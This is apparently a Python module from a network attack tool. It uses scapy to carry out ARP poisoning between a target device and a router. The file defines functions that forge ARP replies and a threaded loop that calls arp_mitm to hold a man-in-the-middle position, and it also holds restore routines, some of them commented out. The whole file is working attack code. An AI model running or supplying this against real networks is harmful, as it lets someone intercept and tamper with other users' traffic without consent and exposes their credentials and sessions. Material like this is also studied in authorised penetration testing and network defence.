import threading
import time

import scapy.all as scapy
from scapy.layers.l2 import arp_mitm
from networking_functions import get_mac


def restore_defaults(dest, source):
    """Restores default ARP settings"""
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def spoofing(target, spoofed):
    """Sends a spoofed ARP packet"""
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)


def arp_poisoning_loop(interface_to_poison, target_device, router_ip, printing_queue, verbosity, cancel_token):
    while not cancel_token.is_set():
        try:
            print(f"Starting spoofing: {target_device['ip']} <- {router_ip}")

            arp_mitm(router_ip, target_device['ip'], iface=interface_to_poison)
            # spoofing(target_device["ip"], router_ip)
            # spoofing(router_ip, target_device["ip"])

            print("\n[!] Arp poisoning thread is exiting. Restoring default ARP settings...")
            # restore_defaults(target_device["ip"], router_ip)
            # restore_defaults(router_ip, target_device["ip"])
            # print("Default settings restored. Exiting.")
        except OSError:
            print('IP seems down, retrying...')
            time.sleep(1)
            continue
        except Exception as e:
            print(f"[ERROR] {e}")

def start_arp_poisoning(interface_to_poison, target_device, router_ip, printing_queue, verbosity):
    cancel_token = threading.Event()
    arp_poisoning_thread = threading.Thread(target=arp_poisoning_loop, args=(interface_to_poison, target_device, router_ip, verbosity, printing_queue, cancel_token))
    arp_poisoning_thread.start()
    return cancel_token